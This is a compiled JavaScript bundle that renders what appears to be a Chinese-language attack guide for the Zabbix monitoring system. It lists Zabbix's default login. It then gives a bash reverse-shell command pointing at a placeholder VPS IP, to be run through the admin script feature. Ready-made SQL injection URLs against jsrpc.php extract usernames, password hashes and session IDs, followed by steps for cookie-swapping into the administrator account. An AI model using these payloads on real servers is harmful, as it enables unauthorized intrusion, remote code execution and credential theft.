(window.webpackJsonp=window.webpackJsonp||[]).push([[98],{821:function(e,s,t){"use strict";t.r(s);var a=t(103),r=Object(a.a)({},(function(){var e=this,s=e.$createElement,t=e._self._c||s;return t("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[t("h2",{attrs:{id:"应用简介"}},[e._v("应用简介 "),t("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[e._v("#")])]),e._v(" "),t("p",[e._v("Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。")]),e._v(" "),t("p",[e._v("可用于监视各种网络服务、服务器和网络机器等状态。本着其开源、安装简单等特点被广泛使用")]),e._v(" "),t("h2",{attrs:{id:"弱口令-后台getshell"}},[e._v("[弱口令]-后台Getshell "),t("a",{staticClass:"header-anchor",attrs:{href:"#弱口令-后台getshell"}},[e._v("#")])]),e._v(" "),t("p",[t("strong",[e._v("默认口令")])]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[e._v("Admin/zabbix\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[t("strong",[e._v("漏洞利用")])]),e._v(" "),t("p",[e._v("在管理-脚本-创建脚本写入反弹"),t("code",[e._v("shell")]),e._v("命令")]),e._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[e._v("bash")]),e._v(" -i "),t("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">&")]),e._v(" /dev/tcp/VPS的IP/6666 "),t("span",{pre:!0,attrs:{class:"token operator"}},[t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("0")]),e._v(">")]),t("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[e._v("&1")]),e._v("\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("在监测-问题处打开一个主机，然后找到刚刚创建的脚本执行")]),e._v(" "),t("h2",{attrs:{id:"sql注入"}},[e._v("SQL注入 "),t("a",{staticClass:"header-anchor",attrs:{href:"#sql注入"}},[e._v("#")])]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[e._v("2.2.x\n3.0.0-3.0.3\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br")])]),t("p",[e._v("攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限")]),e._v(" "),t("p",[t("strong",[e._v("漏洞利用")])]),e._v(" "),t("p",[e._v("在攻击机访问的zabbix的地址后面加上如下url：")]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[e._v("/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&tim\nestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=hi\nstory.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfil\ne=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=\n17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&\nmark_color=1\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br"),t("span",{staticClass:"line-number"},[e._v("2")]),t("br"),t("span",{staticClass:"line-number"},[e._v("3")]),t("br"),t("span",{staticClass:"line-number"},[e._v("4")]),t("br"),t("span",{staticClass:"line-number"},[e._v("5")]),t("br"),t("span",{staticClass:"line-number"},[e._v("6")]),t("br")])]),t("p",[e._v("输出结果，若包含："),t("code",[e._v("You have an error in your SQL syntax")]),e._v(";表示漏洞存在")]),e._v(" "),t("ul",[t("li",[e._v("获取用户名")])]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[e._v("jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("ul",[t("li",[e._v("获取密码")])]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[e._v("jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("ul",[t("li",[e._v("获取sessionid")])]),e._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("http:")]),e._v("//IP/zabbix/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,sessionid,0x7e)%20as%20char),0x7e))%20from%20zabbix.sessions%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17\n")])]),e._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[e._v("1")]),t("br")])]),t("p",[e._v("用户名密码及sessionid值都已得到，可以先对密码md5解密，解密成功可直接进入后台。")]),e._v(" "),t("p",[e._v("解密不成功可以用sessionid值进行Cookie欺骗替换zbx_sessionid即可成功以administrator登陆")])])}),[],!1,null,null,null);s.default=r.exports}}]);